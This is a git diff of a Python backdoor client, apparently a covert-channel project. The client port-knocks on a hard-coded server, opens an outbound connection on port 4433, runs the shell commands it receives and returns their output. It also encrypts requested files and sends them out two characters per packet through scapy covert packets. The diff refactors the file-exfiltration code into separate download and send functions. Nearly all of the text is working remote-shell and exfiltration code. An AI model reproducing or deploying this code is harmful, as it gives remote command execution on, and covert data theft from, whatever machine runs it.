@@ -16,13 +16,12 @@ def change_settings():
 
 import os.path
 import socket, subprocess
-from dcutils import generate_password, encrypt
+from utils import generate_password, encrypt
 from scapy.all import *
 
 PORT = 4433  # The same port as used by the server
-DESTINATION = "192.168.0.25"
+DESTINATION = "192.168.1.149"
 EOF = "G"
-EOL = "Z"
 PORT_KNOCKER = [8000, 7000, 6000, 5000, 4000, 3000, 2000, 1000]
 PASS = ""
 
@@ -40,7 +39,21 @@ def upload(s, cmdArg):
                 totalFS += len(dr)
             else:
                 break
-
+def download(sock,filePath):
+    # call encrypt function - returns file size or data?
+    # read file - return file data
+    # encrypt file data - return character length
+    fileInformation = encrypt_data(filePath)
+    if fileInformation[0] == 0:
+        sock.send(str(fileInformation[0]))
+        print "not a valid file."
+    else:
+        sock.send(str(fileInformation[1])) #send file name + " " + filesize
+        time.sleep(2)
+        send_data_with_covert(fileInformation[0])
+        time.sleep(3)
+        send_data_with_covert(EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF)
+    # send encrypted data using covert + delay + EOF bomb
 
 def create_inside_out_connection():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -59,21 +72,7 @@ def create_inside_out_connection():
         elif cmdArg[0] == "upload":
             upload(s, cmdArg)
         elif cmdArg[0] == "download":
-            # call encrypt function - returns file size or data?
-            # read file - return file data
-            # encrypt file data - return character length
-            fileInformation = encrypt_data(cmdArg[1])
-            if fileInformation[0] == 0:
-                s.send(str(fileInformation[0]))
-                print "not valid file."
-            else:
-                s.send(str(fileInformation[1])) #send file name + " " + filesize
-                time.sleep(2)
-                send_data(fileInformation[0])
-                time.sleep(3)
-                send_data(EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF)
-                print fileInformation[0]
-            # send encrypted data using covert + delay + EOF bomb
+            download(s,cmdArg[1])
         elif data == '':
             break
         else:
@@ -86,12 +85,6 @@ def create_inside_out_connection():
                 stdout_value = 'Command had no output.\n'
             s.send(stdout_value)
 
-            # send output to attacker
-            # for line in stdout_value.splitlines():
-            #    send_data(line,EOL)
-            # send(make_packet(EOF,0))
-            #time.sleep(2)
-            #send_data(stdout_value, EOF)
     # close socket
     s.close()
 
@@ -104,16 +97,9 @@ def encrypt_data(filePath):
     else:
         return [0]
 
-def send_data(sendContent):
-    #global PASS
-    #encryptedString = encrypt(line, PASS)
-    #sendContent = encryptedString + diviser
-    #print line
-    #print sendContent
-    #print len(sendContent)
+def send_data_with_covert(sendContent):
     for i in range(0, len(sendContent), 2):
         new_packet = make_packet(sendContent[i], sendContent[i + 1] if i < len(sendContent) - 1 else 0)
-        print i
         send(new_packet)
 
 
@@ -155,17 +141,12 @@ def port_knocking(password):
         send(packet)
     time.sleep(2)
 
-
-def start_client():
+def main():
+    #change_settings()
     global PASS
     PASS = generate_password()
     port_knocking(PASS)
     create_inside_out_connection()
-
-
-def main():
-    #change_settings()
-    start_client()
 
 
 if __name__ == '__main__':
